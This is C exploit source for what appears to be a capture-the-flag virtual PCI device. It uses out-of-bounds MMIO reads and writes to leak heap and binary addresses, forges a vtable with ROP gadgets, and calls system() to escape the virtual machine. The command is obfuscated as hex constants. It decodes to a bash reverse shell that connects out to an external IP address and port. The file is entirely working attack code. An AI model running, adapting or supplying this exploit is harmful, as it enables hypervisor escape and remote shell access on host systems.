#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
struct PCIBabyDevReg {
	off_t offset;
	unsigned int data;
};


char buffer[0x400];
void hexdump(){
	for (int i = 0; i < 0x40; i++){
		for (int j = 0; j < 0x10; j++){
			printf("%02x ", buffer[i*0x10+j] & 0xff);
		}
		puts("");
	}
}

int main() {
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR|O_SYNC);
	void* mmio = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	unsigned long offset_read(long ofs) {
		unsigned long leak = 0;
		unsigned int tmp0 = 0;
		unsigned int tmp1 = 0;
		((unsigned int *)mmio)[0] = ofs & 0xffffffff;
		((unsigned int *)mmio)[1] = ofs >> 32;
		tmp0 = ((unsigned int *)mmio)[2];

		((unsigned int *)mmio)[0] = (ofs+4) & 0xffffffff;
		((unsigned int *)mmio)[1] = (ofs+4) >> 32;
		tmp1 = ((unsigned int *)mmio)[2];
		leak = tmp1;
		leak <<= 32;
		leak |= tmp0;
		printf("%lx\n", leak);
		return leak;
	}

	void offset_write(long ofs, unsigned long what) {
		unsigned int tmp0 = what & 0xffffffff;
		unsigned int tmp1 = what >> 32;
		((unsigned int *)mmio)[0] = ofs & 0xffffffff;
		((unsigned int *)mmio)[1] = ofs >> 32;
		((unsigned int *)mmio)[2] = tmp0;

		((unsigned int *)mmio)[0] = (ofs+4) & 0xffffffff;
		((unsigned int *)mmio)[1] = (ofs+4) >> 32;
		((unsigned int *)mmio)[2] = tmp1;
	}

	unsigned long heap_leak = offset_read(-8);
	unsigned long heap_base = heap_leak - 0x1162b80;
	printf("heap_base --> %lx\n", heap_base);

	unsigned long vtable = heap_base + 0x1161370;
	unsigned long addr_buffer = heap_base + 0x1161438;
	printf("vtable --> %lx\n", vtable);
	printf("addr_buffer --> %lx\n", addr_buffer);

	//unsigned long pie_leak = offset_read(-25*8);
	unsigned long pie_leak = offset_read(vtable-addr_buffer);
	unsigned long pie = pie_leak - 0xd1d100;
	printf("pie --> %lx\n", pie);

	// 0x008bf0dc: mov rdi, [rax+0x28]; call qword ptr [rax+0x18];
	// 0x00575a09: mov esi, 1; mov rdi, [rax+0x10]; call qword ptr [rax];
	// 0x00648a19: mov rdi, rsp; call qword ptr [rax+0x108];
	unsigned long gadget = pie + 0x00575a09;
	unsigned long system = pie + 0x324150;
	unsigned long call_system = pie + 0x5ce749;


	offset_write(0x00, call_system);
	offset_write(0x08, gadget);
	offset_write(0x10, addr_buffer+0x40);
	offset_write(0x40, 0x7361622f6e69622f);
	offset_write(0x48, 0x61622720632d2068);
	offset_write(0x50, 0x263e20692d206873);
	offset_write(0x58, 0x63742f7665642f20);
	offset_write(0x60, 0x3731322e38312f70);
	offset_write(0x68, 0x2f3239312e33382e);
	offset_write(0x70, 0x3e30203733333133);
	offset_write(0x78, 0x273126);
	offset_write(vtable-addr_buffer, addr_buffer);
}
